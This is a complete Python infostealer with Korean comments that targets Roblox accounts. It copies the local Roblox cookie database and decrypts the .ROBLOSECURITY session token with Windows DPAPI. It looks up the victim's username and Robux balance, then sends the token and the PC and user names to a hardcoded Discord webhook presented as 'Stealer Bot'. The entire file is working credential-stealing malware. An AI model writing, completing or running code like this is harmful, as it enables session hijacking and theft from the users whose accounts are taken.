import os
import sqlite3
import json
import urllib.request
import urllib.error
import tempfile
import shutil
import ctypes

# --- 설정 ---
WEBHOOK_URL = "https://discord.com/api/webhooks/1535875227358076950/DYQ22V18oI1fsGIk41G9rEeu6lGbpCwleFMybPEKlTtHIHfApx9eV4Xi75vQ0GwIUHrR"

# --- 핵심 함수: DPAPI 복호화 ---
def decrypt_dpapi(encrypted):
    try:
        class DATA_BLOB(ctypes.Structure):
            _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.c_char_p)]
        
        # 바이트 문자열 처리
        if isinstance(encrypted, str):
            encrypted = encrypted.encode('utf-8')
            
        blob_in = DATA_BLOB(len(encrypted), encrypted)
        blob_out = DATA_BLOB()
        
        if ctypes.windll.crypt32.CryptUnprotectData(ctypes.byref(blob_in), None, None, None, None, 0, ctypes.byref(blob_out)):
            result = ctypes.string_at(blob_out.pbData, blob_out.cbData).decode('utf-8', errors='ignore')
            ctypes.windll.kernel32.LocalFree(blob_out.pbData)
            return result
    except Exception:
        pass
    return None

# --- 핵심 함수: 쿠키 탈취 및 사용자 정보 조회 ---
def steal_and_identify():
    local = os.environ.get('LOCALAPPDATA')
    if not local:
        return {}

    results = {}

    # Roblox 쿠키 탈취 시도
    roblox_db = os.path.join(local, 'Roblox', 'BrowserService', 'Cookies')
    if os.path.exists(roblox_db):
        try:
            temp_db = tempfile.mktemp(suffix='.db')
            shutil.copy2(roblox_db, temp_db)
            conn = sqlite3.connect(temp_db)
            cur = conn.cursor()
            
            # encrypted_value 컬럼에서 데이터 가져오기
            cur.execute("SELECT name, value, encrypted_value FROM cookies WHERE name='ROBLOSECURITY'")
            row = cur.fetchone()
            
            if row:
                name, value, enc_val = row
                # 암호화된 값이 있으면 복호화 시도, 아니면 값 그대로 사용
                token = decrypt_dpapi(enc_val) if enc_val else value
                
                if token:
                    # 토큰을 사용해 사용자 정보를 가져오는 API 요청
                    try:
                        userinfo_url = "https://www.roblox.com/mobileapi/userinfo"
                        req = urllib.request.Request(userinfo_url)
                        req.add_header('Cookie', f'.ROBLOSECURITY={token}')
                        with urllib.request.urlopen(req, timeout=5) as response:
                            user_data = json.loads(response.read().decode())
                            username = user_data.get('UserName')
                            robux_balance = user_data.get('RobuxBalance')
                            
                            results['Roblox'] = {
                                "username": username if username else "Unknown",
                                "robux": robux_balance if robux_balance else "Unknown",
                                "token": token[:80] + "..."
                            }
                    except Exception as e:
                        # 정보 조회 실패 시 그냥 토큰만 보내기
                        results['Roblox'] = {"username": "Unknown", "robux": "Unknown", "token": token[:80] + "..."}

            conn.close()
            os.remove(temp_db)
        except Exception as e:
            print(f"[오류] Roblox 쿠키 처리 중 문제 발생: {e}")
            if 'temp_db' in locals() and os.path.exists(temp_db):
                os.remove(temp_db)

    return results

# --- 핵심 함수: 웹훅 전송 ---
def send_to_webhook(data):
    try:
        pc_name = os.environ.get('COMPUTERNAME', 'Unknown-PC')
        user_name = os.environ.get('USERNAME', 'Unknown-User')
        
        # Discord 임베드 형식으로 예쁘게 꾸미기
        embed_data = {
            "username": "Stealer Bot",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png",
            "embeds": [
                {
                    "title": "🍪 Roblox 계정 정보 탈취 성공!",
                    "color": 5814783,  # 파란색
                    "fields": []
                }
            ]
        }
        
        if 'Roblox' in data and data['Roblox']:
            roblox_info = data['Roblox']
            embed_data["embeds"][0]["fields"].append({
                "name": "👤 로블록스 닉네임",
                "value": roblox_info.get("username", "Unknown"),  # ✅ 값이 여기에 들어갑니다
                "inline": True
            })
            embed_data["embeds"][0]["fields"].append({
                "name": "💰 로블록스 로벅스",
                "value": str(roblox_info.get("robux", 0)),
                "inline": True
            })
            embed_data["embeds"][0]["fields"].append({
                "name": "🔑 토큰 (Token)",
                "value": roblox_info.get("token", "N/A"),  # ✅ 값이 여기에 들어갑니다
                "inline": False
            })
        
        # PC 정보도 추가
        embed_data["embeds"][0]["fields"].append({
            "name": "💻 컴퓨터 이름",
            "value": pc_name,
            "inline": True
        })
        embed_data["embeds"][0]["fields"].append({
            "name": "👤 사용자 이름",
            "value": user_name,
            "inline": True
        })
        
        # JSON 직렬화 후 전송
        payload = json.dumps(embed_data)
        req = urllib.request.Request(WEBHOOK_URL, data=payload.encode('utf-8'), headers={'Content-Type': 'application/json'})
        
        with urllib.request.urlopen(req, timeout=10) as response:
            print("✅ 데이터 전송 성공!")
            
    except Exception as e:
        print(f"❌ 전송 실패: {e}")

# --- 메인 실행 ---
def main():
    print("▶️ 인포스틸러 시작 중...")
    results = steal_and_identify()
    send_to_webhook(results)
    print("완료됨.")

if __name__ == "__main__":
    main()
